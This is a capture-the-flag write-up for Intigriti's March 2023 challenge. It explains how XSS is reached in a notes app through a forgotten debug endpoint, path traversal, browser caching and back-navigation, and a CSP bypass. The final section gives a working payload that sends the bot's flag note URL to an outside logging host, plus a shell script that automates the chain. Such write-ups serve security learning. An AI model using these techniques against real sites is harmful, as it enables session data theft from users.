# 0323 Intigriti's March challenge
Make sure to follow [h43z](https://twitter.com/h43z) on twitter for more fun stuff.

## Introduction
A good start is by just clicking through the UI of https://challenge-0323.intigriti.io/ and trying all the functionalities and look at every URL.

 - `https://challenge-0323.intigriti.io/create` create a note with title and content
  - `https://challenge-0323.intigriti.io/notes` lists notes
 - `https://challenge-0323.intigriti.io/note/bf8614cc-0da7-407a-b46d-3640d1de0cad?id=bf8614cc-0da7-407a-b46d-3640d1de0cad` shows a specific note

Seems to be very simple note taking app. Without any login. As the server side code is open source (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L57) we see exactly how it works.

It just creates a session cookie which kind of acts as a "login" to separate users. All notes are cleared from the in memory "database" (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L20) once an hour.

Only who creates a note you will be able to view it too because every note id is a random UUID and you get access to the list of your notes through your own session cookie.

The goal of this challenge will be to steal a FLAG. The flag is a "secret" that is stored in another users note. The other user is represented in this challenge by `bot.js` (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/bot.js). It's a function that gets triggered by the endpoint `/visit?url=https://your_cool_note_link`. 

If you read the `bot.js` code you can see it's starting an headless chrome instance. Creating the secret flag note and afterwards visiting whatever URL we provided to it.

Ultimately we will need to craft a URL/Website that when given to this bot will somehow read the note with the flag and exfiltrate it back to us, the attacker.

It may be tempting to just host a web page with code like https://editor.43z.one/6hm2c 
```
response = fetch("https://challenge-0323.intigriti.io/notes")
// then exfiltrate ... 
```
and call it a day. But the modern internet is build upon the concept of the **SameOriginPolicy**, which says, no browser will allow a webpage to simply read the response from a page on another origin. 

## Excurse into CORS
But a website operator can configure his server to allow CORS - cross origin resource sharing - by responding with specific headers to allow foreign origins to read the responses. This is exactly what the software engineer of this challenge did here.
```
const URL = "http://127.0.0.1";
...
app.use(
  cors({
    origin: [URL], // CORS 👊
    credentials: true,
    allowedHeaders: ["Content-Type", "mode"],
  })
);
```
In this case CORS will only be allowed from the origin `http://127.0.0.1`.  

Just to be clear 100% clear CORS is a browser based mechanism. It's the opposite to the SOP. SOP closes access down, CORS opens it up again (if wanted by the web hoster). Outside of the context of browsers CORS and SOP do nothing.

At first sight it may be confusing to allow CORS from `127.0.0.1`. Because 99.9% of web apps run on the loopback address `127.0.0.1` anyway. Every page can read it's own origin. Setting it to the localhost IP is mostly done for testing. 

Imagine a production API running on `https://coolapi.com` and a production web frontend running on `https://coolfrontend.com`. Allowing CORS on `coolapi.com` from `127.0.0.1` is just a convenience for developers of `coolfrontend.com`. It allowes them to develop and run the frontend locally on `127.0.0.1` and the javascript they write can still make use of the production API at `coolapi.com`. 

After the developers push their code to production all the requests done on clients from javascript on `coolfrontend.com` will obviously have the origin `https://coolfrontend.com` when hitting `coolapi.com`. So the `coolapi.com` servers will need to get configured and allow CORS from `coolfrontend.com`.

The express cors middleware in this hypothetical scenario would look something like 
```
app.use(
  cors({
    origin: ['http://127.0.0.1', 'https://coolfrontend.com']
  })
);
```
This may have been an unnecessary tangent for this challenge but I think it's still very important to fully grasp `SOP` and `CORS`.

It's always useful to *really* understand what the code does. In the case of this challenge the CORS code is kind of an artifact for testing. But for as as an attacker the express cors middleware, makes no difference. It could be removed and everything would still be the same for us.

## The idea of a solution
In order to read the flag we will have to somehow inject code (XSS) into a page that either runs on the origin `127.0.0.1` or `challenge-0323.intigriti.io`. Let's be more clear and check what the `bot.js` actually uses. 
```
const URL = "http://127.0.0.1";
...
await page.goto(`${URL}/create`);
await delay(1000);
// Click submit button
await page.evaluate(() => {
	try {
		document.getElementsByName("title")[0].value = "FLAG";
		document.getElementsByName("body")[0].value = "INTIGRITI{f4k3}"; // update this
		document.getElementById("note-submit").click();
	} catch (e) {
		console.log("Error inside page.evaluate():", e);
	}
});
await delay(1000);
// Visit the user input URL
await page.goto(url);
```
It uses the default loopback address `127.0.0.1` for the ``
page.goto(`${URL}/create`);``. It could have very well used the public facing `challenge-0323.intigriti.io` domain, as the bot obviously has access to the internet but the developer chose the local address.

You may ask yourself why this is important for us. The bot creates the flag note and the note will exist for users that go to `127.0.0.1` (the bot) and for the ones that use `challenge-0323.intigriti.io` (the outside world). It's the same application just accessed differently!

But the key thing is that whatever the bot used as the origin, we will need to request through a potential XSS vulnerability (which we hopefully will find later). That is because the "login" mechanism is cookie based and cookies are bound to origins. 

Imagine we already found that XSS and somehow made the bot execute ``response = fetch(`https://challenge-0323.intigriti.io/notes`)`` we would not find the flag note listed in the response. 

Only a ``fetch(`http://127.0.0.1/notes`)`` would send the correct cookies and get us the just created note with the flag in the response. 

But enough theorizing let's start bug hunting. 

## Looking for bugs
`https://challenge-0323.intigriti.io/notes` includes two javascript files `/challenge/app.js` and `/challenge/notes.js`.

`app.js` just registers  `document.getElementById("note-submit").addEventListener("click", ()=> {...` onclick handler. Interestingly there is no element `note-submit`. Bad application design! The `notes.js` is equally weird but again not interesting.

`app.js` comes first into play on `https://challenge-0323.intigriti.io/create`. It just sends the `title` and `body` of a note to the server via POST request.

After clicking a note you created you get to a URL looking like this `https://challenge-0323.intigriti.io/note/bf8614cc-0da7-407a-b46d-3640d1de0cad?id=bf8614cc-0da7-407a-b46d-3640d1de0cad`

That looks weird. You have the note id in the path `/note/bf8614cc-0da7-407a-b46d-3640d1de0cad` and then again as a GET parameter id `?id=bf8614cc-0da7-407a-b46d-3640d1de0cad`. What's going on here?

Inspecting the page source you see that the title of the note is already coming populated from the server `<h2 class="msg-info"> my title </h2><br>` but the note's content is not 
```
<div id="noteContent" class="form-group">
                    {{ body }}
                </div>
```
If you check the server side code for that route you will see why.
```
app.get("/note/:id", (req, res) => {
	// TODO: Congifure CORS and setup an allowList
	let mode = req.headers["mode"];
	if (mode === "read") {
		res.setHeader("content-type", "text/plain"); // no xss	
		res.send(getPostByID(req.params.id).note);
	} else {
		return res.render("note", { title: 		getPostByID(req.params.id).title });
	}
});
```
If there is no header key named `mode`  with a value equal to `read` (which there isn't if you just open the url with your browser. It's not a default header a browser sends) it will jump into the else block. Here the templating engine constructs a template named `note` and only feed it with the `title` before it is send to the client.

Obviously if you check the website and not just the initial page source in your browser you can see a note content (or body) there too. But as we just confirmed it's not coming from the initial request. The note content is fetched in `view.js` with javascript after the initial page is loaded.
```
    id = params.get("id").trim().replace(/\s\r/,'');
    fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
    .then(response => {
        return response.text()
    })
    .then(data => {
        if (data) {
            window.noteContent.innerHTML = DOMPurify.sanitize(data, {FORBID_TAGS: ['style']}); // no CSS Injection
        } else {
            document.getElementsByClassName("msg-info")[0].innerHTML="404 😭"
            window.noteContent.innerHTML = "404 😭" 
        }
    })
```
And here for the first time things get interesting. We have sink and a source. An attacker can control the `id` variable for ``fetch(`/note/${id}\``. Whatever the response is from that request will get into the classic sink of `innerHTML` in `window.noteContent.innerHTML = DOMPurify.sanitize(data, {FORBID_TAGS: ['style']});`.

But that sink is protected with `DOMPurify`. This makes XSS almost impossible.

In a normal flow of the application this  code snipped would fetch a certain id and get into the `if` block on the server.
```app.get("/note/:id", (req, res) => {
	// TODO: Congifure CORS and setup an allowList
	let mode = req.headers["mode"];
	if (mode === "read") {
		res.setHeader("content-type", "text/plain"); // no xss	
		res.send(getPostByID(req.params.id).note);
	} else {
```

Because this time the `mode` header was set to `read` by the client side code. 
`````
fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
 `````
 
If it wasn't for the DOMpurify this would be an easy XSS for us. 

You'd just have to create a note with the content of a payload for example `<img/src/onerror=alert(1)>`. And then give the full url of that note to the `/visit?url=URL_OF_PAYLOAD_NOTE` endpoint. The bot would pop an `alert` and we could start working on a real payload that reads the flag and exfiltrate it back to us. 

And even though we can control the `id` value in the fetch call which effectively gives us the power to guide the request to any endpoint of the challenge we want (`?id=/anything/we/like`) it simply does not change the fact that at the end of the day the response will go through DOMpurify and get sanitized. 

As it's highly unlikely that the challenge author expects us to find a bypass to DOMpurify we need to find another angle to attack.

## Let's talk about caches
Cache entries are basically HTTP responses written to disk or memory, that way if your browser makes a request he already did in the past he can pull it up directly from your computer instead of requesting it again from the remote server, which would take much longer.

All kinds requests are under certain circumstances eligible to be cached. It doesn't matter if it's a image loaded via `<img src=...>` or web page opened via the URL bar of your browser or if it's done from javascript via a `fetch()` call.

I will use my own tool https://httpx.43z.one to play with caching a bit more. 

The tool is quite useful as it allows you to construct full responses within the URL itself. It's nice for showcasing and running quick tests. Every browser does caching differently. For us of most interest will be google chrome as the `bot.js` does use it. I will be using my other web tool https://editor.43z.one (simple editor like codepen/jsfiddle) to host code snippets. 

The example below is at https://editor.43z.one/79n8a.
```
const url = `https://httpx.43z.one?status=200&`
const responseHeaders = `access-control-allow-origin=*&cache-control=max-age=5`

fetch(url+responseHeaders)
```
We start by constructing the URL for the `httpx` web tool. Remember what we talked about in the beginning `CORS`.  The origin from where the snippet will be running is`editor.43z.one` and that's different from `httpx.43z.one`. That's why we need the browser to allow us our `CORS` request. 
We do that by telling the server (`httpx`) to respond with the header `access-control-allow-origin=*`. This gives any origin the ability to read the response and potentially cache it.

The next header controls how the browser will behave in caching this very response `cache-control=max-age=5`. It instructs the browser to cache the response for exactly 5 seconds.

Now if you open a new tab and go to https://editor.43z.one/79n8a (but make sure you already have the dev tools opened and switched to the network tab) and press the `run` button a few times - to re-execute the javascript code - you will see this.

![enter image description here](https://imgur.com/PCPbIss.png)
`(disk cache)` nicely indicates when the request was not send to the remote server and the response was directly, quickly pulled from your machine instead. Exactly how we told it, the page `https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=5` stays in the cache for five seconds.

And the cool thing is that after running the script above https://editor.43z.one/79n8a you can go and open a new tab with the exact URL from the fetch call ``https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=5`` and as expected it would use the version from the cache, if you do it within 5 seconds.

But it has to be said that the behavior is not standardized. Firefox seems to have different rules when something is used from cache and when not.

## Caching in the challenge
Now what does this all have to do with the challenge?  Remember the `fetch` call.
`````
fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
 `````
What if if make the bot do this request to a note which holds a payload we prepared. The chrome puppeteer instance then caches the response. Afterwards we make the bot open the note URL directly and hope it will use the cached version.

If it works there will not be another request that get us into the `else` block where we just land in the `DOMpurify` trap again.
```
app.get("/note/:id", (req, res) => {
	// TODO: Congifure CORS and setup an allowList
	let mode = req.headers["mode"];
	if (mode === "read") {
		res.setHeader("content-type", "text/plain"); // no xss	
		res.send(getPostByID(req.params.id).note);
	} else {
		return res.render("note", { title: 		getPostByID(req.params.id).title });
	}
});
```
But instead just gives us the content of the note and nothing more.

The theory sounds good until you realize there is this line `res.setHeader("content-type", "text/plain"); // no xss	`

Even if the browser would cache the response, it's of the wrong content type. We can easily test how browsers react with a `text/plain` content header with the `httpx` tool again. https://httpx.43z.one/?status=200&body=%3Cscript%3Ealert(1)%3C/script%3E&content-type=text/plain

![enter image description here](https://imgur.com/SX5z7hW.png)
It does not render any elements. Just plain text. In order for this to work we would need the content type of `text/html`

![enter image description here](https://imgur.com/yNITO0R.png)
If there only was a endpoint in the challenge that would return the note and not set such the `text/plain` content header.

Oh look there is one! A debug endpoint which was forgotten to be removed by the developer.

```
// DEBUG Endpoints
// TODO: Remove this before moving to prod
app.get("/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id", (req, res) => {
  let mode = req.headers["mode"];
  if (mode === "read") {
    res.send(getPostByID(req.params.id).note);
  } else {
    return res.status(404).send("404");
  }
});
```
This helps us a lot. Browsers seem to be very eager to render if there is no content type header present. 

We can again use `httpx` to confirm this easily, https://httpx.43z.one/?status=200&body=%3Cscript%3Ealert(1)%3C/script%3E shows an alert.

## A vary rabbit hole
So let's give this a try on the challenge
- go over to https://challenge-0323.intigriti.io/create and create a test note.
- click on the test note we created
- prepend the `id` GET parameter with `../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/`
- and send that new request

(By the way it always makes sense to automate these annoying tasks with a simple `shell/python/nodejs` script. Especially when you will be doing them many times during your exploration)

So we turned

`https://challenge-0323.intigriti.io/note/bea5becd-e3bd-4c66-93f5-4e318b97e17d?id=bea5becd-e3bd-4c66-93f5-4e318b97e17d`

into

`https://challenge-0323.intigriti.io/note/bea5becd-e3bd-4c66-93f5-4e318b97e17d?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`

we used a path traversal "trick" of `../` to get away from the `/note` route that is predefined in the `fetch` call.
```
fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
 `````
by using this trick it effectively goes back one directory 

```fetch(`/note/../${id}`, {```

and we make sure to hit the `/debug` endpoint.

After we sent the manipulated request it's time to open the direct URL of the note that was done via `fetch()` call and is now hopefully cached `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`

![enter image description here](https://imgur.com/qwle0kT.gif)
Bummer! It's not working. The response does not get pulled from the cache. Maybe it has something to do with the `vary: Origin` header that is present in the response from the request to `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`

![enter image description here](https://imgur.com/MxWllAO.png)
We can use `httpx` again to test if this is what's causing the trouble here.
First without using the header in question.
```
const url = `https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=100&body=hello${Date.now()}`

fetch(url)
setTimeout(_=>location=url, 1000)
```
We execute the `fetch` call and then we change the current document URL to the same URL we just fetched. https://editor.43z.one/njqq8/i 

![enter image description here](https://imgur.com/wAiyuJx.png)
Works perfectly. Now we add the header.
![enter image description here](https://imgur.com/O0OJFO3.png)
And it stops serving from the cache. 
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary

> The **`Vary`** HTTP response header describes the parts of the request message aside from the method and URL that influenced the content of the response it occurs in. Most often, this is used to create a cache key when [content negotiation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation) is in use.

The browser takes into account the origin of the request when it decides if to show the response from the cache. And in our case the Origins differ. `fetch()` adds automatically the origin of `editor.43z.one` or in the case of the challenge `challenge-0323.intigriti.io`. But if you open an URL from the URL bar (or use in javascript `location=url` or `open(url)`) there is no `origin` header set to the request.

Wait! But is this really the reason it did not cache? If we look again into the response header we will see that there isn't even a `cache-control` header present.

![enter image description here](https://imgur.com/MxWllAO.png)
Maybe this is actually the reason why it's not getting cached at all. By reading through some MDN articles I stumbled upon this. https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching#heuristic_caching

> HTTP is designed to cache as much as possible, so even if no Cache-Control is given, responses will get stored and reused if certain conditions are met. This is called heuristic caching.

But who the heck knows why chrome is not heuristically caching it?! I don't, maybe someone of you out there can chime in or point us to the right documentation to read.

Anyway there goes the dream of using the HTTP cache to solve this challenge. Or is there another kind of cache?

## Hello backward forward cache

https://web.dev/bfcache/

> Back/forward cache (or bfcache) is a browser optimization that enables instant back and forward navigation. It significantly improves the browsing experience for users—especially those with slower networks or devices.

Let's give this bfcache a try and see how it works in action.

![enter image description here](https://imgur.com/wH46vQL.png)
Let's go step by step. First Opening a prepared payload note URL in which we put the debug URL into the `id`. Then opening the just fetched URL directly. As expected and tested before it's not cached. Next we press the browsers back button.

Interesting at this stage, we see almost no requests happening in the dev tools, not even from cache. I guess the page must come from the bfcache then and the chrome dev tools just don't indicate it in any way. The page just appears out of thin "bfcache" air.

What's happening next is crucial. After pressing forward, we see again the 404 error page which means it's not our prepended payload note **but** the page is coming from the cache! That is kind of unexpected. Why does it not appear from thin air (bfcache) like the page before?

Turns out chrome actually has some information about the bfcache. It's inside the Application tab.

![enter image description here](https://imgur.com/871NKoP.png)
And there it gives us the reason why this page was not served from the bfcache. 

> Only pages with a status code of 2XX can be cached

And by that it probably means bf-cached. All this is thanks to the `debug` endpoint, ``app
res.status(404).send("404")``
```
app.get("/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id", (req, res) => {
  let mode = req.headers["mode"];
  if (mode === "read") {
    res.send(getPostByID(req.params.id).note);
  } else {
    return res.status(404).send("404");
  }
});
```

This is all great news because somehow this made chrome use the HTTP cache instead! The only problem is we had the wrong thing in the cache. 

What if we just rearrange the requests. Instead of opening the URL in the order we did it before

1.  /note/...?id=../debug/...  (makes fetch call)
2. /debug/.... (does not pull from cache, just does request again)
3. backward to /note/...?id=../debug/... (pulls page from bfcache)
4. forward to /debug/.... (pulls response from http cache, from step 2)

instead we do it like this 
1.  /debug/.... (makes regular request, gets 404 as no mode read header present)
2. /note/...?id=../debug/... (fetch call, with correct mode header, gets payload note response)
3. backward to /debug/.... (pulls from http cache but this time from step 2 which was done with correct headers)

Now in action...

![enter image description here](https://imgur.com/P69I4uh.png)
It finally rendered the test payload note from HTTP cache by, not really using the the BF cache but just the backward button?! Without the backward button chrome did not want the serve the page from the cache. Maybe this is the *heuristically* caching strategy at work or it's a bug in chrome?!

## First stage exploit
Before we can finally craft a payload note that extracts the flag. We will have to come up with a way that the `bot.js` does the same thing, we did above, going backwards in the browser history. Fortunately this backward/forward triggering is accessible via javascript too and not just the UI.

But even before going backward we will also have to create a page that opens the two links before.
This is how such  page could look like https://editor.43z.one/n97cm
```
params = new URL(location).searchParams
url1 = params.get('url1')
url2 = params.get('url2')

if(url1 && url2){
 w = open(url1)
 setTimeout(_=>w.location = url2, 2000)
 setTimeout(_=>w.location = `https://httpx.43z.one?status=200&body=<script>history.go(-2)<\/script>`, 3000)
}
```
This first stage "exploit" takes two URLs as GET parameters. 

It then goes on to call `open(url1)`, which opens a new tab and loads url1 in it. Luckily headless chrome allows popups by default.

That new tab is stored into the variable `w`. Two seconds later it changes the location of `w` to the second URL. And then another second later it opens an URL of the `httpx` tool that simply returns some tiny javascript `history.go(-2)`.  

We cannot simply use `w.history.go(-2)` because the tab origin and the "exploits" origin will be different. Exploit will have `editor.43z.one` and the tab `challenge-0323.intigriti.io`. The browser will not allow access to the window object of a cross origin tab. That's why we have to simply open some other page that serves the javascript.


## Second stage or how to read the flag

One way to read the bots secret note is to put following code into our payload note.
```

<script>
	r = fetch("http://127.0.0.1/notes").then(x => x.text()).then(console.log)
</script>
```
(If you don't understand the `127.0.0.1` here, read the `What we need to find` section again)

But not so quick! If we do the "backward" spiel with our crafted payload we will get this.

![enter image description here](https://imgur.com/OkwzB9c.png)
All the pages on the challenge have a CSP. https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L47
```
default-src 'self'; 
style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';
font-src fonts.gstatic.com 'self'; 
script-src 'self'; 
base-uri 'self'; 
frame-src 'self'; 
frame-ancestors 'self';  
object-src 'none';
```
The script source can only be `self` no inline scripts are allowed.

Good that there is an injection possibility in the 404 endpoint.
```
 app.get("*", (req, res) => {
  res.setHeader("content-type", "text/plain"); // no xss)
  res.status = 404;
  try {
    return res.send("404 - " + encodeURI(req.path));
  } catch {
    return res.send("404");
  }
});
```
See how the path is almost unchanged returned to the client `return res.send("404 - " + encodeURI(req.path));`.

The developers comment `  res.setHeader("content-type", "text/plain"); // no xss)` is true. But we can still use this endpoint in a src attribute for a `<script src=...>` tag.

We cas use `httpx` to confirm this https://editor.43z.one/4xjv4

```
<script src="//httpx.43z.one?status=200&content-type=text/plain&body=alert(1)"></script>
```
shows an alert. 

Luckily for us the developer made a mistake in setting the status code with `res.status = 404;`. That's not how you do it with express. It's correctly done like this `res.status(404)`.

If the status code was really 404 on that endpoint it would not work for us anymore.
You can confirm this with `httpx` again, by switching `?status=200` with `?status=404`. All you get is browser error.

To turn the `404 - /noneexistingpath` into valid javascript we simply choose a path like `a/;alert(1)`

This way the response becomes `404 - /a/;alert(1)`. A number (404) minus a regex (/a/). Then our actual payload can follow. https://editor.43z.one/vndh9
```
<script src="https://challenge-0323.intigriti.io/a/;alert(1)"></script>
```
But we will run into trouble if we use a more complex payload. Like the initial idea of

```
r=fetch('http://127.0.0.1/notes').then(x=>x.text()).then(console.log)
```
The the `encodeURI` would turn it into 
```
r=fetch('http://127.0.0.1/notes').then(x=%3Ex.text()).then(console.log)
```
It encodes all characters except 
```
A–Z a–z 0–9 - _ . ! ~ * ' ( )

; / ? : @ & = + $ , #
```
We would either need the `=>` for an anonymous arrow function or `{}` for defining a regular function to get the result from `fetch`

There is an alternative though to using javascript and `fetch`. 

The CSP says `frame-src 'self'; ` we can just an `iframe` and frame the `/notes` endpoint this way we don't have to use all the code for `fetch()` just access it directly via the html element.
The iframe is on the same origin as the payload note itself so it should be no problem to access the content of the iframe.

```
<iframe id=i src=http://127.0.0.1/notes></iframe>
<script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
```
`document.links` provides us with all links on the page. And the first one will be the URL of the flag note.

A neat alternative to `document.links[0]` namely `document.links.item(0)`  is used that way we don't run into the issue of `encodeURI` escaping `[]`.

But if we test the payload above we will get an error.

![enter image description here](https://imgur.com/zbmh1lV.png)
Although there clearly is a "test" flag note in the iframe. And if we run `i.contentDocument.links.item(0).href` manually we get the URL of it, the payload it self was not able to get it and says `item(0)` was undefined.

This indicates that at the time the payload script run the iframe with `/note` was not yet loaded fully.

There is a syntax of `setTimeout()` that would not make use of `=>` or `{}` that could possibly help us here. `setTimeout('alert(...)', 2000)`, this would give enough time until the iframe was finished loading. But CSP does not allow it. 

From https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_eval_expressions

> If a page has a CSP header and `'unsafe-eval'` isn't specified with the `script-src` directive, the following methods are blocked and won't have any effect:

-   `eval()`
-   `Function()`
-   When passing a string literal like to methods like: `setTimeout("alert(\"Hello World!\");", 500);`
    -   `setTimeout()`
    -   `setInterval()`
    -   `window.setImmediate`
-   `window.execScript()`


In our case `'unsafe-eval'` is not specified within the CSP. 

But there is another neat trick to delay the javascript execution. By placing a `style` that `import`'s garbage. But we still have to respect that CSP
```
style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';
```
If we run this test payload note
```
<iframe id=i src=http://127.0.0.1/notes></iframe>
<style>@import '//fonts.gstatic.com'</style>
<script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
```
we will alert the flag URL. Not we just have to exfiltrate it back. We just change the documents `location` to server we have access to and append the secret note URL to the path. I'm going to use https://log.43z.one. Another tool I created that simply logs all requests that were made to it. 

`location = 'https://log.43z.one' + flag`


# Final instructions
1. create the note with the content and call the note id of it **PAYLOAD_ID**
```
<iframe id=i src=http://127.0.0.1/notes></iframe>
<style>@import '//fonts.gstatic.com'</style>
<script src="http://127.0.0.1/a/;location='//log.43z.one/'+i.contentDocument.links.item(0).href)"></script>
```

2. Construct **URL1** like this https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/**PAYLOAD_ID**

3. Construct **URL2** like this https://challenge-0323.intigriti.io/note/**PAYLOAD_ID**?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/**PAYLOAD_ID**

4. Construct a web page with the following content and name it's URL **FIRST_STAGE**

```
params = new URL(location).searchParams
url1 = params.get('url1')
url2 = params.get('url2')

if(url1 && url2){
 w = open(url1)
 setTimeout(_=>w.location = url2, 2000)
 setTimeout(_=>w.location = `https://httpx.43z.one?status=200&body=<script>history.go(-2)<\/script>`, 3000)
}
```
  

6. Construct **VISIT_URL** like this **FIRST_STAGE**?url1=**URL1**&url2=**URL2**

7. Open the URL https://log.43z.one in a Tab 1
8. Open the URL https://challenge-0323.intigriti.io/visit?url=**VISIT_URL** in Tab 2
9. Watch Tab 1 until the URL of note with the flag appears
10. Open URL of flag note 
11. Enjoy the flag `INTIGRITI{b4ckw4rD_f0rw4rd_c4ch3_x55_3h?}`

Here is how it looks exploiting the challenge locally with the setting `headless` to `false`.

![enter image description here](https://imgur.com/Imt05NF.png)

Here the final script that does all the tasks we did manually before.
```
#!/bin/sh
# dependencies curl, pup, jq

CHALLENGE="https://challenge-0323.intigriti.io"
ENDPOINT="http://127.0.0.1"

# create the contents of the payload note
# store it as JSON into payload.txt ready to be passed to /create
cat << EOF > payload.txt
{"title":"payload","note":"<iframe id=i src=$ENDPOINT/notes></iframe><style>@import'//fonts.gstatic.com'</style><script src=\"$ENDPOINT/a/;location='//log.43z.one/'+i.contentDocument.links.item(0).href\"></script>"}
EOF

# send request to the challenge to create the note
# read POST body from payload.txt
curl -s -b cookies.txt -c cookies.txt "$CHALLENGE/create" -X POST -H 'Content-Type: application/json' --data-binary "@payload.txt"

# extract the id of the payload note we just created
id="$(curl -s -b cookies.txt -c cookies.txt "$CHALLENGE/notes" | pup "li > a attr{href}" | tail -c 37)"

# generate the URL that will be given to /visit
# the first stage exploit editor.43z.one/kczdj that takes two parameters
# url1 is debug endpoint to our payload note
# url2 is the /note endpoint that fetches the debug payload note
encoded="$(echo "https://editor.43z.one/kczdj/i?url1=$ENDPOINT/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/$id&url2=$ENDPOINT/note/$id?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/$id" | jq -sRr @uri)"

# append the FULL URL to the /visit endpoint
echo "$CHALLENGE/visit?url=$encoded"

```


## THE END
That was fun. Learned a lot.  I hope you did too.

twitter: [h43z](https://twitter.com/h43z) 
homepage: [h.43z.one](https://h.43z.one) 
